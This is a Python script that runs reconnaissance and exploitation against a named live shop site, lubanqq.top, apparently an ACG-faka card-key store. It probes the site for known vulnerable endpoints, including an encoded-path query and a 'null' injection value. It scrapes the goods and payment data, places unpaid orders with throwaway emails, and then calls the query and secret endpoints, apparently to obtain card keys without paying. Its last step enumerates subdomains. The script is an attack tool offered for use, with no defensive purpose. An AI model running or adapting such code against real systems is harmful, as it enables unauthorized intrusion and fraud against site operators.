#!/usr/bin/env python3
"""lubanqq.top ACG-faka first-pass: SUCCESS_CASES N/A + query/secret/subdomains."""
import json
import os
import re
import socket
import subprocess
import time
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings()

OUT = Path(os.environ.get("OUT") or "/data/recon/lubanqq")
(OUT / "dump").mkdir(parents=True, exist_ok=True)
(OUT / "probe").mkdir(parents=True, exist_ok=True)
(OUT / "subs").mkdir(parents=True, exist_ok=True)

B = "https://lubanqq.top"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


def log(*a):
    print(*a, flush=True)


def sess():
    s = requests.Session()
    s.verify = False
    s.headers.update(
        {
            "User-Agent": UA,
            "Origin": B,
            "Referer": B + "/",
            "Accept-Language": "zh-CN,zh;q=0.9",
        }
    )
    return s


def main():
    findings = {
        "target": B,
        "stack": "acg-faka",
        "interesting": [],
        "kami_obtained": False,
        "kami": [],
        "success_cases": {},
    }
    s = sess()

    r = s.get(B + "/", timeout=30)
    title = re.search(r"<title>([^<]+)", r.text)
    findings["home"] = {
        "code": r.status_code,
        "len": len(r.text),
        "title": title.group(1) if title else None,
        "acg": "/user/api/index" in r.text or "/user/index/query" in r.text,
        "cookie": r.headers.get("Set-Cookie", "")[:120],
    }
    (OUT / "probe" / "home.html").write_text(r.text, encoding="utf-8")
    log("HOME", findings["home"])

    # SUCCESS_CASES rainbow/yk
    for label, path, data in [
        ("rainbow_getcount", "/shop/ajax.php?act=getcount", None),
        ("rainbow_ajax", "/shop/ajax.php?act=query&page=1", None),
        ("api61", "/%61pi.php?act=search&id=1", None),
        ("yk_null", "/index.php?m=Home&c=Order&a=query", {"value": "null"}),
    ]:
        try:
            if data is not None:
                rr = s.post(B + path, data=data, timeout=15)
            else:
                rr = s.get(B + path, timeout=15)
            findings["success_cases"][label] = {
                "code": rr.status_code,
                "body": rr.text[:180],
            }
        except Exception as e:
            findings["success_cases"][label] = {"err": str(e)}
        log("SC", label, findings["success_cases"][label])

    # ACG APIs
    for path in [
        "/user/api/site/info",
        "/user/api/index/data",
        "/user/api/index/pay",
        "/user/api/index/commodity?categoryId=1",
    ]:
        rr = s.get(B + path, headers={"X-Requested-With": "XMLHttpRequest"}, timeout=20)
        log("API", path, rr.status_code, rr.text[:220].replace("\n", " "))
        try:
            j = rr.json()
        except Exception:
            j = None
        findings[path] = j if j is not None else rr.text[:300]

    # categories + goods
    cats = findings.get("/user/api/index/data") or {}
    goods = []
    for c in cats.get("data") or []:
        cid = c.get("id")
        rr = s.get(
            B + f"/user/api/index/commodity?categoryId={cid}",
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=20,
        )
        try:
            j = rr.json()
        except Exception:
            continue
        data = j.get("data") or []
        if isinstance(data, dict):
            data = data.get("list") or []
        for g in data:
            g["_cat"] = c.get("name")
            goods.append(g)
        log("cat", cid, c.get("name"), "n", len(data))
    (OUT / "dump" / "goods.json").write_text(
        json.dumps(goods, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    findings["goods_count"] = len(goods)

    # unpaid trade probe
    pay = findings.get("/user/api/index/pay") or {}
    pay_ids = []
    for p in pay.get("data") or []:
        if "余额" not in str(p.get("name")) and p.get("handle") not in ("#system", "Balance"):
            pay_ids.append(p.get("id"))
    if not pay_ids:
        pay_ids = [2, 3]
    cheap = None
    for g in sorted(goods, key=lambda x: float(x.get("price") or 9999)):
        cheap = g
        break
    if cheap:
        for pid in pay_ids:
            contact = f"recon{int(time.time())}@mailinator.com"
            body = {
                "commodity_id": cheap["id"],
                "num": 1,
                "pay_id": pid,
                "device": 0,
                "password": "",
                "coupon": "",
                "race": "",
                "from": 0,
                "contact": contact,
            }
            rr = s.post(
                B + "/user/api/order/trade",
                data=body,
                headers={"X-Requested-With": "XMLHttpRequest"},
                timeout=25,
            )
            log("TRADE", cheap.get("id"), "pay", pid, rr.text[:280].replace("\n", " "))
            try:
                tj = rr.json()
            except Exception:
                tj = None
            findings["trade_probe"] = {"payload": body, "resp": tj or rr.text[:400]}
            if isinstance(tj, dict) and tj.get("code") == 200:
                findings["interesting"].append("unpaid_trade")
                tn = (tj.get("data") or {}).get("tradeNo")
                findings["poc_tradeNo"] = tn
                # query + secret shapes
                q = s.post(
                    B + "/user/api/index/query",
                    data={"keywords": tn},
                    headers={"X-Requested-With": "XMLHttpRequest"},
                    timeout=20,
                )
                log("QUERY_TN", q.text[:300].replace("\n", " "))
                sec = s.post(
                    B + "/user/api/index/secret",
                    data={"orderId": tn, "password": ""},
                    headers={"X-Requested-With": "XMLHttpRequest"},
                    timeout=20,
                )
                log("SECRET_TN", sec.text[:220].replace("\n", " "))
                findings["poc_query"] = q.json() if q.text.startswith("{") else q.text[:300]
                findings["poc_secret"] = sec.json() if sec.text.startswith("{") else sec.text[:300]
                (OUT / "dump" / "unpaid_order.json").write_text(
                    json.dumps(tj, ensure_ascii=False, indent=2), encoding="utf-8"
                )
                break

    # subdomain probe (qq898 path)
    subs = {}
    for sub in ["sb", "shop", "store", "wallet", "api", "checker", "shopping", "www"]:
        host = f"{sub}.lubanqq.top"
        try:
            ips = sorted({x[4][0] for x in socket.getaddrinfo(host, None)})
        except Exception as e:
            ips = [f"err:{e}"]
        url = f"https://{host}/api/records"
        try:
            rr = s.get(url, timeout=12)
            body = rr.text[:160]
            code = rr.status_code
        except Exception as e:
            body, code = str(e), None
        subs[sub] = {"ips": ips, "records_code": code, "body": body}
        log("SUB", sub, ips, code, body[:100].replace("\n", " "))
    findings["subs"] = subs
    (OUT / "subs" / "probe.json").write_text(
        json.dumps(subs, ensure_ascii=False, indent=2), encoding="utf-8"
    )

    (OUT / "dump" / "FINDINGS_RAW.json").write_text(
        json.dumps(findings, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("INTERESTING", findings["interesting"])
    log("DONE")


if __name__ == "__main__":
    main()
